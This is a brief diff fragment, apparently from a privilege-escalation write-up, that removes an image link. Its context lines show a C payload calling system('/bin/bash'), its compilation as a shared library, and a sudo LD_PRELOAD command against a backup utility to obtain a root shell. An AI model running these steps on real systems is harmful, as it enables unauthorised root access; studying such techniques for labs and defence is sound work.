@@ -110,8 +110,6 @@ system("/bin/bash");
 
 }
 
-<img width="1272" height="449" alt="image" src="https://github.com/user-attachments/assets/c1c98424-783b-45bf-9d73-79b4628bc6a9" />
-
 gcc shell.c -o exploit -fPIC -shared -nostartfiles -w
 
 sudo LD_PRELOAD=/tmp/exploit /usr/bin/sky_backup_utility
